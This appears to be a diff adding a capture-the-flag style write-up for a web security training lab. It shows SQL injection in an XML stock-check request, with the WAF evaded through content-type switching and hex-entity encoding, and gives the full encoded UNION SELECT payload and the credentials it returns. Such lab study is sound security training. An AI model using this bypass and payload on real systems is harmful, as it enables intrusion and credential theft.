@@ -155,3 +155,78 @@ The page will now render the data in that single column like this:
     
 
 You can now copy the password for the `administrator` and log in.
+
+# 🏆 Lab: SQLi with Filter Bypass via XML Encoding
+
+## 🎯 Objective
+
+Exploit a hidden SQL injection vulnerability in a "Check Stock" feature that is protected by a WAF (Web Application Firewall) that blocks standard SQL keywords.
+
+## 🛠️ The Solution Walkthrough
+
+### 1. Intercept the Request
+
+When clicking "Check Stock," the original request is sent as a standard POST form:
+
+- **Header:** `Content-Type: application/x-www-form-urlencoded`
+    
+- **Body:** `productId=1&storeId=1`
+    
+
+### 2. Bypass Phase 1: Content-Type Switching
+
+The server's WAF is tuned to watch for SQLi in standard form parameters. To bypass this, we manually change the request format to **XML**, which the backend also supports but the WAF inspects less strictly.
+
+- **New Header:** `Content-Type: application/xml`
+    
+- **New Body:**
+    
+    XML
+    
+    ```
+    <?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>1</productId>
+        <storeId>1</storeId>
+    </stockCheck>
+    ```
+    
+
+### 3. Bypass Phase 2: Hex Entity Encoding
+
+Even in XML, the WAF will block words like `UNION` or `SELECT`. To hide these, we encode the entire SQL payload into **XML Hex Entities**.
+
+- **Raw SQL:** `1 UNION SELECT username || '~' || password FROM users`
+    
+- **Encoded for XML:** `1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;...` (and so on)
+    
+
+### 4. Final Payload Injection
+
+Replace the value inside the `<storeId>` tag with the encoded payload:
+
+XML
+
+```
+POST /product/stock HTTP/2
+Host: [LAB-ID].web-security-academy.net
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
+</stockCheck>
+```
+
+## 🚩 Result
+
+The XML parser decodes the entities _after_ the WAF check, executing the query and returning the credentials: **`administrator:p4ssw0rd`**
+
+---
+
+### 💡 Why this worked for you
+
+1. **Context Switching:** You moved the attack from a "high-security" context (Form data) to a "low-security" context (XML).
+    
+2. **Obfuscation:** You used Hex to ensure the WAF didn't see a single readable SQL keyword.
